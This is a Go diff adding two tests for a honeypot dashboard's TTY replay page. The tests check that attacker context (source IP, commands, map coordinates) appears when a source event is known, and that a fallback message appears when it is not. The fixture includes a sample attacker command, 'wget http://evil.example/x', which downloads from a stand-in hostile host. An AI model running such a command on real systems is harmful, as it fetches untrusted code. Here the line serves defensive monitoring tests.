@@ -152,6 +152,75 @@ func TestServeTTYReplayJSONServesRecords(t *testing.T) {
 	}
 }
 
+// TestServeTTYReplayShowsAttackerReplayWhenSourceEventKnown covers #1268
+// "ask 2": the Attacker replay tab needs to resolve the recording's own
+// source IP from the in-memory event cache and populate attackerData for
+// it -- confirms the page actually carries that context (IP, a command,
+// and the map coordinates) rather than falling back to the no-context
+// empty state.
+func TestServeTTYReplayShowsAttackerReplayWhenSourceEventKnown(t *testing.T) {
+	s, tmpl := newTestTTYStore(t)
+	shasum := strings.Repeat("1", 64)
+	s.events = []storedEvent{
+		{
+			SrcIP: "203.0.113.55", Sensor: "cowrie", Session: "sess-1",
+			Time: "2026-08-12 10:00:00", UTC: "2026-08-12T10:00:00Z",
+			Command: "wget http://evil.example/x", Country: "US",
+			// TTYReplay holds the full "/tty/<hash>" link classify.go's own
+			// cowrie.log.closed branch sets it to (#612/#638) -- not the
+			// bare shasum, which caught a real bug in this test's first
+			// draft: it originally seeded the bare hash here, which
+			// happened to match this file's own first-draft comparison
+			// bug in tty_replay.go, so the test passed for the wrong
+			// reason until a live end-to-end check caught the mismatch.
+			Lat: 37.75, Lon: -97.8, TTYReplay: "/tty/" + shasum, Detail: "command: wget http://evil.example/x",
+		},
+	}
+
+	req := httptest.NewRequest(http.MethodGet, "/tty/"+shasum, nil)
+	w := httptest.NewRecorder()
+	s.serveTTYReplay(w, req, tmpl)
+	if w.Code != http.StatusOK {
+		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
+	}
+	body := w.Body.String()
+	if !strings.Contains(body, "203.0.113.55") {
+		t.Errorf("expected the resolved source IP in the Attacker replay tab, got: %s", body)
+	}
+	if !strings.Contains(body, "wget http://evil.example/x") {
+		t.Errorf("expected the attacker's own command history in the timeline, got: %s", body)
+	}
+	if !strings.Contains(body, `data-lat="37.75"`) || !strings.Contains(body, `data-lon="-97.8"`) {
+		t.Errorf("expected the map marker's coordinates from the source event's own Lat/Lon, got: %s", body)
+	}
+	if strings.Contains(body, "Attacker context isn&#39;t available") {
+		t.Errorf("should not show the no-context fallback when a source event was found")
+	}
+}
+
+// TestServeTTYReplayAttackerTabFallbackWhenSourceUnknown covers the other
+// half: a shasum with no matching TTYReplay in the current in-memory event
+// cache (rolled off the log-tail window, or never resolved) must degrade to
+// an explanatory empty state, not a zero-value attacker profile that would
+// read as a real (if oddly blank) attacker.
+func TestServeTTYReplayAttackerTabFallbackWhenSourceUnknown(t *testing.T) {
+	s, tmpl := newTestTTYStore(t)
+	shasum := strings.Repeat("2", 64)
+	req := httptest.NewRequest(http.MethodGet, "/tty/"+shasum, nil)
+	w := httptest.NewRecorder()
+	s.serveTTYReplay(w, req, tmpl)
+	if w.Code != http.StatusOK {
+		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
+	}
+	body := w.Body.String()
+	if !strings.Contains(body, "Attacker context isn") {
+		t.Errorf("expected the no-context fallback message, got: %s", body)
+	}
+	if strings.Contains(body, "tty-attacker-map") {
+		t.Errorf("must not render the map (or any attacker-scoped content) with no resolved source IP, got: %s", body)
+	}
+}
+
 func TestServeTTYReplayESUnavailable(t *testing.T) {
 	s := &store{}
 	tmpl := template.Must(template.New("t").Funcs(templateFuncs(nil, "")).Parse(pageTemplate))
